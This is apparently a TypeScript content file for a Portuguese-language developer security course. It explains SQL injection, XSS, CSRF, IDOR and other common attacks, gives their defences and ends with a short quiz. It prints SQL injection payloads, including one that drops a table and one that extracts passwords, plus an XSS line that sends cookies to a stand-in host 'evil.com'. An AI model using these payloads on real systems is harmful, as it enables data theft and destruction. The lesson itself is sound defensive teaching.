import type { Topic } from '@/lib/types';

export const ataquesComuns: Topic = {
  slug: '07-ataques-comuns',
  number: 7,
  title: 'Ataques Comuns',
  emoji: '⚠️',
  shortDescription: 'SQL Injection, XSS, MITM e outros ataques que todo dev precisa conhecer.',
  sections: [
    {
      title: 'SQL Injection',
      content: `SQL Injection ocorre quando entrada do usuário é inserida diretamente em uma query SQL sem sanitização. O atacante insere código SQL malicioso que é executado pelo banco.

Exemplo de código VULNERÁVEL:
  query = "SELECT * FROM users WHERE email = '" + email + "'"

Se o usuário digitar:  ' OR '1'='1
A query vira:  SELECT * FROM users WHERE email = '' OR '1'='1'
Resultado: retorna TODOS os usuários!

Outros payloads:
  ' OR 1=1 --        → bypassa autenticação
  '; DROP TABLE users --  → apaga tabela
  ' UNION SELECT senha FROM users --  → expõe dados

DEFESA:
• Sempre usar prepared statements / queries parametrizadas
• Nunca concatenar input do usuário em SQL diretamente
• ORMs (como Drizzle, Prisma) fazem isso automaticamente`,
      codeExample: {
        language: 'python',
        code: `# VULNERÁVEL - nunca faça isso!
query = f"SELECT * FROM users WHERE email = '{email}'"
cursor.execute(query)

# SEGURO - use parâmetros
query = "SELECT * FROM users WHERE email = %s"
cursor.execute(query, (email,))

# Com ORM (Drizzle, SQLAlchemy, etc.) - automaticamente seguro
db.select().from(users).where(eq(users.email, email))`,
        explanation: 'Prepared statements tratam o input do usuário como dado, nunca como código SQL. Isso elimina SQL Injection completamente.',
      },
    },
    {
      title: 'XSS (Cross-Site Scripting)',
      content: `XSS ocorre quando um atacante consegue injetar código JavaScript malicioso em uma página que outros usuários veem. O script roda no navegador da vítima.

Tipos:
• Stored XSS: script salvo no banco → executa para todos que veem a página
• Reflected XSS: script no parâmetro da URL → vítima clica no link malicioso
• DOM XSS: manipulação do DOM sem passar pelo servidor

Exemplo de payload:
  <script>document.cookie → fetch('evil.com?c='+document.cookie)</script>

Consequências: roubo de cookies/sessão, redirecionamento, keyloggers

DEFESA:
• Escapar todo output HTML (never trust user input displayed)
• Content Security Policy (CSP) headers
• Cookies com flag HttpOnly (JS não acessa)
• Frameworks modernos (React, Vue) escapam por padrão`,
      tip: 'React escapa strings automaticamente ao renderizar. Cuidado com dangerouslySetInnerHTML — use apenas com conteúdo sanitizado.',
    },
    {
      title: 'Outros ataques importantes',
      content: `MITM (Man-in-the-Middle):
Atacante se posiciona entre cliente e servidor, interceptando/alterando tráfego.
Defesa: HTTPS/TLS com certificado válido, certificate pinning.

CSRF (Cross-Site Request Forgery):
Site malicioso faz requisições autenticadas em nome do usuário sem que ele saiba.
Defesa: tokens CSRF, SameSite cookies, verificar Origin header.

Brute Force:
Testa milhares de senhas até encontrar a correta.
Defesa: rate limiting, bloqueio por tentativas, MFA, senhas fortes.

DDoS (Distributed Denial of Service):
Inunda o servidor com tráfego para derrubá-lo.
Defesa: CDN, rate limiting, serviços anti-DDoS (Cloudflare, AWS Shield).

IDOR (Insecure Direct Object Reference):
Acessar recursos de outros usuários alterando um ID.
  GET /api/invoices/1234 → tenta /api/invoices/1235
Defesa: verificar autorização em toda requisição, não só autenticação.`,
    },
  ],
  quiz: [
    {
      question: 'Qual é a defesa principal contra SQL Injection?',
      options: [
        'Criptografar o banco de dados',
        'Usar firewall no servidor',
        'Usar prepared statements / queries parametrizadas',
        'Limitar o tamanho dos campos do formulário',
      ],
      correctIndex: 2,
      explanation: 'Prepared statements separam código SQL de dados. O input do usuário é sempre tratado como dado, nunca como código SQL executável. ORMs aplicam isso automaticamente.',
    },
    {
      question: 'O que o flag HttpOnly em um cookie garante?',
      options: [
        'O cookie só funciona em conexões HTTP, não HTTPS',
        'O cookie não pode ser acessado por JavaScript, apenas pelo servidor',
        'O cookie expira quando o navegador fecha',
        'O cookie é criptografado automaticamente',
      ],
      correctIndex: 1,
      explanation: 'HttpOnly impede que JavaScript acesse o cookie via document.cookie. Isso protege contra XSS: mesmo que um atacante injete JavaScript malicioso, ele não consegue roubar o cookie de sessão.',
    },
    {
      question: 'O que é um ataque IDOR?',
      options: [
        'Um ataque que injeta código em banco de dados',
        'Acessar recursos de outros usuários manipulando IDs diretamente na URL/requisição',
        'Um tipo de ataque de negação de serviço',
        'Interceptar tráfego entre cliente e servidor',
      ],
      correctIndex: 1,
      explanation: 'IDOR (Insecure Direct Object Reference) ocorre quando a aplicação expõe referências internas (IDs) sem verificar se o usuário tem permissão. A defesa é sempre checar autorização no servidor, não confiar em IDs recebidos.',
    },
  ],
};
